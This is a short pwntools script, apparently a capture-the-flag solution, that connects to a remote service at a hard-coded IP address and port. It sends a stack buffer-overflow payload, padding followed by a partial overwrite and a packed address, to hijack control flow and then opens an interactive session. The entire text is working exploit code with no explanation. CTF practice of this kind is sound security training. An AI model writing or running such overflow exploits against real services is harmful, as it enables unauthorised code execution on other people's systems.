from pwn import *

p = remote('23.236.125.55','10003')
p.recvuntil('Which function would you like to call?\n')
length = 0x2a-0xc
payload = 'A'*length + '\xd8' + p32(0x000006D8)
p.sendline(payload)
p.interactive()
